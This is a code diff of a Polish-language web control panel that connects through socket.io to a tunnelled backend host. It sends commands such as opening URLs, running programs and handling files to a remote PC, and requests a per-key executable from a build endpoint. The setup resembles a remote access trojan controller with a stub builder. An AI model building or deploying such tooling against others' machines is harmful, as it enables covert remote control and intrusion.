@@ -13,7 +13,6 @@ document.addEventListener('DOMContentLoaded', function() {
     });
     // Default tab
     document.querySelector('.tablink.active').click();
-    // Buttons
     document.getElementById('loginBtn').onclick = login;
     document.getElementById('generateExeBtn').onclick = generateExe;
 });
@@ -21,8 +20,8 @@ document.addEventListener('DOMContentLoaded', function() {
 function login() {
     key = document.getElementById('keyInput').value.trim();
     if (!key) return document.getElementById('loginError').innerText = "Podaj klucz!";
-    // Podmień na swój backend!
-    socket = io('https://your-backend-server.com:3000');
+    // Ustaw swój backend! Przykład z playit.gg:
+    socket = io('https://cell-membership.gl.at.ply.gg:19701', { transports: ['websocket'] });
     socket.emit('connect_with_key', {key});
     socket.on('connected_to_pc', () => {
         document.getElementById('controlSection').style.display='block';
@@ -38,7 +37,6 @@ function send(command, data={}) {
     if (!key || !socket) return;
     socket.emit('control_command', {key, command, data});
 }
-// Pomocnicze funkcje do inputów
 function getUrl() { return document.getElementById('urlInput').value; }
 function getProgram() { return document.getElementById('programInput').value; }
 function getFileName() { 
@@ -69,7 +67,7 @@ function showStatus(msg) {
 function generateExe() {
     const key = document.getElementById('genKeyInput').value.trim();
     document.getElementById('exeStatus').innerHTML = "Generowanie... (może potrwać do minuty)";
-    fetch('https://your-backend-server.com:3000/api/build_exe', {
+    fetch('https://cell-membership.gl.at.ply.gg:19701/api/build_exe', {
         method: "POST",
         headers: {"Content-Type":"application/json"},
         body: JSON.stringify({key})
